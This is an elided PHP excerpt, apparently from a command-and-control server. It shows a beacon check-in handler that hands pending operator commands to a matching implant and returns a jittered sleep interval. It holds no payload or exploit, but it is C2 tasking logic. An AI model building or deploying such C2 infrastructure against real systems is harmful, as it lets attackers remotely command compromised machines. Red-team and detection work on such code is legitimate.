...
function handleBeaconCheckin(): void {
    ...
    foreach ($tasks as &$t) {
        if (($t['beacon_uuid'] ?? '') === $uuid && ($t['status'] ?? '') === 'pending') {
            ...
            $assigned[] = ['id' => (string)$t['id'], 'command' => $t['command']];
            $changed = true;
        }
    }
    unset($t);
    if ($changed) $db->setTable('tasks', $tasks);
    // Short sleep right after task delivery (beacon executes immediately, comes back fast);
    // burst mode beacon-side keeps follow-ups snappy too
    jsonOut(['tasks' => $assigned, 'sleep' => $assigned ? 2 : rand(4, 9)]);
}
